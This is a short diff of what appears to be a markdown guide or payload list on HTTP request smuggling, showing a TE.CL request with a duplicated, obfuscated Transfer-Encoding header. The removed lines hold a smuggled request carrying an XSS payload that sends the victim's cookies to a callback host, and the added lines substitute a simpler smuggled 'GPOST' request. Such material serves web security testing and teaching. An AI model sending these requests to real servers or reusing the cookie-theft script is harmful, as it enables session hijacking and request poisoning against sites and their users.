@@ -1429,17 +1429,15 @@ Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
 Transfer-encoding: identity
-
-e6
-GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
+\r\n
+5c\r\n
+GPOST / HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
-
+\r\n
 x=1
 0\r\n  
 \r\n
-  
 ```  
 
 ![GPost Obfuscating the TE header](images/gpost.png)  
